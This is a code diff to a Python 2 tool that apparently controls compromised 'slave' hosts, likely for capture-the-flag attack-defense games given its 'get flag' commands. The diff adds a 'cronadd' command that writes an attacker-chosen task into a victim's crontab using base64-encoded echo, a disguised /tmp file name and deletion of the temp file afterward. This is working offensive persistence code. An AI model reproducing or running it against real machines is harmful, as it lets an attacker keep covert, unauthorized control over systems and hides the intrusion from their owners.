@@ -181,6 +181,28 @@ class Slave():
         command = "crontab -l > %s" % (target_file)
         self.send_command_print(command)
 
+    def add_crontab(self, content):
+        # 1. Save old crontab
+        Log.info("Saving old crontab")
+        chars = string.letters + string.digits
+        target_file = "/tmp/%s-system.server-%s" % (random_string(0x20, chars), random_string(0x08, chars))
+        self.save_crontab(target_file)
+        # 3. Add a new task
+        content = content + "\n"
+        Log.info("Add new tasks : %s" % (content))
+        command = 'echo "%s" | base64 -d >> %s' % (content.encode("base64").replace("\n", ""), target_file)
+        self.send_command(command)
+        # 4. Rescue crontab file
+        Log.info("Rescuing crontab file...")
+        command = 'crontab %s' % (target_file)
+        self.send_command(command)
+        # 5. Delete temp file
+        Log.info("Deleting temp file...")
+        command = "rm -rf %s" % (target_file)
+        self.send_command(command)
+        # 6. Receving buffer data
+        print recvall(self.socket_fd)
+
     def auto_connect(self, target_host, target_port):
         # 1. Save old crontab
         Log.info("Saving old crontab")
@@ -253,6 +275,7 @@ def show_commands():
     print "        5. [gf] : get flag"
     print "        6. [gaf] : get all flag"
     print "        7. [c] : command for all"
+    print "        7. [cronadd] : add crontab"
     print "        10. [cl] : command to log"
     print "        8. [setl] : set local execute"
     print "        9. [setr] : set remote execute"
@@ -292,7 +315,7 @@ def main():
     time.sleep(0.25)
     Log.info("Connecting to localhost server...")
     slaver_thread.start()
-    time.sleep(0.25)
+    time.sleep(0.5)
     show_commands()
     position = slaves[slaves.keys()[0]].node_hash  # master himself
     while True:
@@ -330,6 +353,9 @@ def main():
             for i in slaves.keys():
                 slave = slaves[i]
                 result = slave.send_command_log(cmd)
+        elif command == "cronadd":
+            content = raw_input("Input new crontab task (* * * * * date): ") or ("* * * * * date")
+            current_slave.add_crontab(content)
         elif command == "g":
             input_node_hash = raw_input(
                 "Please input target node hash : ") or position
